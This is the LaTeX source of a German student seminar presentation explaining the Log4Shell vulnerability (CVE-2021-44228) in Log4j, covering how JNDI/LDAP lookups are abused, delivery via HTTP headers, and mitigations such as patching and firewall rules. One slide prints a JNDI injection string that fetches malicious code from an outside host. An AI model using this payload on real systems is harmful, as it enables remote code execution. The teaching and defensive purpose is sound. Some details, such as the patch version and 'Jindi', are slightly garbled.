\documentclass{beamer}

%style
\mode<presentation>
\usetheme{Boadilla}

%Packages
\usepackage[utf8]{inputenc}
\usepackage[ngerman]{babel}
\usepackage{graphicx}
\usepackage{booktabs}
\usepackage{mathtools}
\usepackage{amsmath}
\usepackage{listings}
\usepackage[utf8]{inputenc}
\usepackage[ngerman]{babel}
\usepackage[T1]{fontenc}
\usepackage{lmodern}
\usepackage{tabto}
\usepackage{listings}
\usepackage{framed} 
\usepackage{xcolor} 
\colorlet{shadecolor}{gray!25}
%bibtex
\usepackage[backend=biber, style=authoryear]{biblatex}
\addbibresource{referenzen.bib}

%Einstellungen der Präsentation
\title[Netzwerk und Systemsicherheit]{Log4J zu Log4Shell}
\subtitle{Netzwerk und Systemsicherheit}
\author{Moritz Rupp}
\institute[MR]{Hochschule Albstadt-Sigmaringen}
\setbeamertemplate{navigation symbols}{}%remove navigation symbols
\date{WS 21/22}

%Beginn der Präsentation
\begin{document}

%Titelseite
\begin{frame}
\titlepage
\end{frame}
%Inhaltsverzeichnis
\begin{frame}
\frametitle{Inhalt}
\tableofcontents    
\end{frame}
\section{Was ist Log4J und Log4Shell?}
\begin{frame}{Was ist Log4J?}
\begin{itemize}
 \item Java Framework zum Loggen von Anwendungsmeldungen\\
 - Open Source
 \item Entwickelt ab 1996 bei IBM
 \item Seit anfang 2000 der Standart für Logging\\
 \item Verwendung auf allen relevanten Plattformen\\
 $\Rightarrow$ Windows, Linux, MacOs\\
 $\Rightarrow$ Läuft auf über 3 Milliarden Geräten
 \item Adaption der Log4J Konzepte von vielen Programmiersprachen\\
 - Log4C, Log4cplus, Log4js, Logging in Python 
 \item Betreuung durch das Apache Logging Projekt\footnote{apache.org}
\end{itemize}
\end{frame}
\begin{frame}{Was ist Log4Shell?}
\begin{itemize}
\item Zero-Day Sicherheitslücke in der Log4J Biblothek
\item Erster Report Ende November 2021 durch Mitarbeiter von Alibaba 
\item Veröffentlichung am 10. Dezember 2021 unter CVE-2021-44228
\item Ermöglicht Arbitary Code Execution\\
$\Rightarrow$ Remote Code Exection, Reverse Shell etc.
\item BSI stuft Log4shell mit Bedrohungslage 4/Rot ein

\end{itemize}
\begin{center}
 \includegraphics[scale=0.35]{bsilog4j.png}\footnote{bsi.de}
\end{center}


 
\end{frame}
\section{Trivia}
\begin{frame}{Trivia}
 \begin{itemize}
  \item Über 3 Milliarden Geräte potenziell Betroffen
  \item Gilt als größte Sicherheitslücke seit Shellshock
  \item Viele Große It-Infrastrukuren betroffen\\
  - Apple, Steam, Twitter, Amazon, Cloudflare, Tesla etc.
  \item Nach wie vor Aktuell
  
  
 \end{itemize}

\end{frame}

\section{Funktionsweise}
\subsection{Log4J}
\begin{frame}{Funktionsweise}
\begin{itemize}
 \item Große Anzahl an Konfigurationsmöglichkeiten\\
$\Rightarrow$ log4j.xml
\item Meist jedoch für einfaches Logging verwendet
\end{itemize}
\begin{center}
\includegraphics[scale=0.45]{log4jexample.png}
\end{center}
\end{frame}
\begin{frame}
 \begin{block}{Lookups}
  Bieten die Möglichkeit Umgebungsvariablen auszulesen\\
  - zB. Datum, Betriebssystem, Verzeichniss etc.
 \end{block}
 \begin{center}
 \includegraphics[scale=0.45]{lookupsexample.png}
 \end{center}
 \begin{itemize}
  \item  Über 50 verschiedene Lookups möglich
  \item  Darunter Jindi
 \end{itemize}


 \end{frame}

\subsection{Jindi}
\begin{frame}{Jindi}
$\Rightarrow$ `Java Naming and Directory Interface`\footnote{apache.com}
\begin{itemize}
 \item Web-API für Objektabfragen\\
 - Meist genutzt für Datenbankabfragen
 
 
 \item Jindi darf mit anderen Servern Kommunizieren\\
 $\Rightarrow$ logger.info("\$\{jndi: Server-IP\}")
\end{itemize}

\end{frame}
\subsection{Ldap}
\begin{frame}{LDAP}
$\Rightarrow$ 'Lightweight Directory Access Protocol'\footnote{wikipedia.org}
 \begin{itemize}
  \item Protokoll für Nutzwerverwaltung\\
  - 'Darf sich dieser Nutzer einloggen?'\\
  - 'War dieser Nutzer schonmal hier?'
  \item Verwendung in Kombination mit Log4j und jndi\\
  $\Rightarrow$ 'Logge die Anzahl der Logins dieses Nutzters'
  \item Läuft meist als externe Server-Instanz
 \end{itemize}

\end{frame}
\section{Log4Shell}
\begin{frame}{Log4Shell}
\begin{center}
$\Rightarrow$ \textbf{\$\{jndi:ldap//:myserver.de/schadcode\}}
\end{center}
\begin{itemize}
\item Injektion durch User-Eingaben oder händisch\\
- Anmeldeformulare, Suchfunktion\\
- Http Request mit curl\\
 \item Ab Version 2.0 bis 2.5.1 möglich
\end{itemize}


\end{frame}
\subsection{Funktionsweise Log4Shell}
\begin{frame}{Log4Shell Funktionsweise}
\begin{center}
\includegraphics[scale=0.35]{log4s.png}\footnote{draw.io}
\end{center}
\end{frame}
\begin{frame}
 \begin{itemize}
 \item Payloadübergabe kann über etliche Wege erfolgen\\
  - HTTP Header\\
  - Fehlerhafte HTTP Request
  \item String muss entsprechend Endcodes sein\\
  - base64, urlencoding
  \item Schadcode muss compilierter Java Byte-Code sein
 \end{itemize}

\end{frame}
\section{Proof of Concept}
\begin{frame}{Praktische Vorstellung}
 
\end{frame}
\section{Lösungsansätze}
\begin{frame}{Lösungsansätze}
\begin{itemize}
 \item Log4J Updaten auf 2.1.6
 \item Userinput validieren
 \item Firewall Regeln entsprechend auslegen\\
 - Output-Chain auschließlich für bekannte Dienste.
 \end{itemize}
 \begin{center}
 \includegraphics[scale=0.35]{outputchainldpa.png}
 \end{center}
 
\end{frame}
\begin{frame}
\begin{center}
\includegraphics[scale=0.35]{firewall.png}\footnote{draw.io}
\end{center}
\end{frame}
\section{Fazit und Ausblick}
\begin{frame}{Fazit und Ausblick}
 \begin{itemize}
  \item Größte Sicherheitslücke der letzten 10 Jahre
  \item Ausmaße noch nicht bekannt
  \item Möglich nur durch Zusammenspiel vieler einzelner Komponenten\\
  $\Rightarrow$ JAVA $\rightarrow$ LOG4J $\rightarrow$ LOOKUPS $\rightarrow$ JNDI $\rightarrow$ LDAP\\
  - Tech-Stack zu groß?\\
  - Over-Engineering?
  \item  Anwendungen werden zu Komplex
  
 \end{itemize}
 \begin{center}
   logger.info("Vielen Dank für Ihre Aufmerksamkeit")
 \end{center}

\end{frame}
\begin{frame}{Quellen}
1 | apache.org, 19.02.2022, https://logging.apache.org/log4j/2.x/ \\
2 | bsi.de, 15.02.2022, https://www.bsi.bund.de/DE/Themen/Unternehmen\-und\-Organisationen/Informationen\-und\-Empfehlungen/Empfehlungen\-nach\-Angriffszielen/Webanwendungen/log4j/log4j\_node.html \\
3 | apache.org, 18.02.2022, https://aries.apache.org/documentation/modules/jndiproject.html\\
4 | wikipedia.org, 12.01.2022, https://en.wikipedia.org/wiki/Lightweight\_Directory\_Access\_Protocol\\
5-6 | draw.io, 20.02.2022, https://draw.io\\ 
Vorlesungsfolien Netzwerk und Systemsicherheit, Prof. Dr. Christian Henrich, Wintersemester 2021/22\\
Proof of concept | https://github.com/christophetd/log4shell-vulnerable-app
\end{frame}











\end{document}

